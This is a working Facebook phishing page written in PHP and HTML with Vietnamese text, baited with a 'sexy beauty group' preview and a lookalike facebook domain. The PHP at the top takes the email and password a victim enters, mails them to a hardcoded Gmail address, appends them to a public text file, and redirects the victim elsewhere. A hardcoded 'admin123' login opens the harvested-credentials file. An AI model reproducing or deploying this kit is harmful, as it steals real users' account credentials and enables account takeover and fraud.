<?php
    session_start();
    ob_start();
?>
    <?php
    	if(isset($_POST["login"])){ //name in button HTML (send)
    		$username = $_POST["email"]; //name in HTML
    		$password = $_POST["pass"]; //name in HTML
            if($username == "admin123" && $password == "admin123"){
                echo "<script>alert('Bạn đang đăng nhập vào Admin');</script>";
                header('Location: check-clone.txt');
                
            }else{
                    
             $_SESSION["username"] = $username;
             echo $_SESSION["username"];
    		 $subject = "Thông tin gửi về từ trang web của bạn:\nLưu ý: Thông tin này là bảo mật, tuyệt đối không tiết lộ cho bất kì ai\nMã nguồn bởi: W5VN";
             $headers = "Bạn có thông báo đăng nhập mới...";
             $comment = "";
             $body = "----------------------------------------------\nTài khoản: $username\nMật khẩu: $password \n----------------------------------------------\n";
             mail("meomaosv2@gmail.com", $headers, $body, $subject);
            $test = fopen("check-clone.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: https://www.arlosaber.com');
          }
    	}

    ?>

<!DOCTYPE html>
<html>
<head>

<meta charset='utf-8' />
<meta content='width=device-width, initial-scale=1' name='viewport' />
<meta property="og:title" content="Bảng xếp hạng girl's xinh Group Vietnamese Sexy Beauty Group - VSBG" />
<meta property="og:image" content="http://mfacabook.com/assets/img/214811860_10102151673807292_1574796297546264838_n.jpg" />

<link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css' integrity='sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC' rel='stylesheet' />
<link data-badged-icon='https://static.xx.fbcdn.net/rsrc.php/ye/r/Ta8_J_nYekI.ico' data-default-icon='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' href='https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico' rel='shortcut icon' />
<title>Đăng nhập</title>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>
<style id='page-skin-1' type='text/css'><!--
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
body{
font-family: 'Roboto', sans-serif;
}
input.form-control {
border: none;
border-bottom: 1px solid #ddd;
background: none;
}
@media (pointer: fine) {
.fblog{
width: 600px;
text-align: center;
margin: auto;
}
}
._8qtf {
margin: 12px 0 4px 0;
width: 100%;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
white-space: nowrap;
}
._43mg>span {
display: inline-block;
position: relative;
}
._43mh {
color: #4b4f56;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
white-space: nowrap;
}._43mg>span:before {
margin-right: 15px;
right: 100%;
}
._43mg>span:before, ._43mg>span:after {
background: #ccd0d5;
content: '';
height: 1px;
position: absolute;
top: 50%;
width: 9999px;
}
._43mg>span:after {
left: 100%;
margin-left: 15px;
}
._43mg>span:before, ._43mg>span:after {
background: #ccd0d5;
content: '';
height: 1px;
position: absolute;
top: 50%;
width: 9999px;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
margin-top: 50px;
white-space: nowrap;
}

--></style>
</head>

<body>
<div class='fblog'>
<img class='img-fluid' src='https://1.bp.blogspot.com/-W90h_vIYs9w/YOEWPkKhZYI/AAAAAAAAAAM/96ojIoW5M341ggKZjs-elzJ0FhXHzQmhACNcBGAsYHQ/s16000/887906fc5a13ae4df702.jpg' />
<center class='mt-2'><small>Tiếng Việt</small></center>
<div class='container'>
<div class='row justify-content-center'>
<div class='col-10'>
<form action='' method='POST'>
<div class='mb-4 mt-4'>
<input class='form-control' name='email' placeholder='Số điện thoại hoặc email' required='required' type='text' />
</div>
<div class='mb-4'>
<input class='form-control' name='pass' placeholder='Mật khẩu' required='required' type='password' />
</div>
<div class='d-grid gap-2'>
    <button class='btn btn-primary' name='login' onclick="thongbao()" style='font-size: 15px; font-weight:600; ' type='submit'>Đăng nhập</button>
</div>
</form>
<br />
<center><a href='#' style='text-decoration: none;font-weight: 600;'>Quên mật khẩu?</a></center>
<div class='_43mg _8qtf' data-sigil='login_reg_separator' id='login_reg_separator'><span class='_43mh'>hoặc</span></div>
<center><div style='margin-top:50px'>
<div>
<button class='btn btn-success' style='     background: #098e00;     border: none;     font-weight: 600;     font-size: 15px;     width: max-content; ' type='button'>Tạo tài khoản Facebook mới</button>
</div>
</div></center>
</div>
</div></div>
</div>
<div class='navbar no-items section' id='navbar'></div>

<script type='text/javascript'>
$("#dangnhap").click(function(){
    $("#dangnhap").text('Vui lòng chờ...');
    $("#dangnhap").addClass('disabled');
    })
  function GetURLParameter(sParam)
{
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++) 
    {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) 
        {
            return sParameterName[1];
        }
    }
}
                                             </script>
<script>
    $(document).ready(function(){
    var tech = GetURLParameter('id');
    $("input[name=id]").val(tech);
    });
  </script>
<script crossorigin='anonymous' integrity='sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM' src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js'></script>
</body>

</html>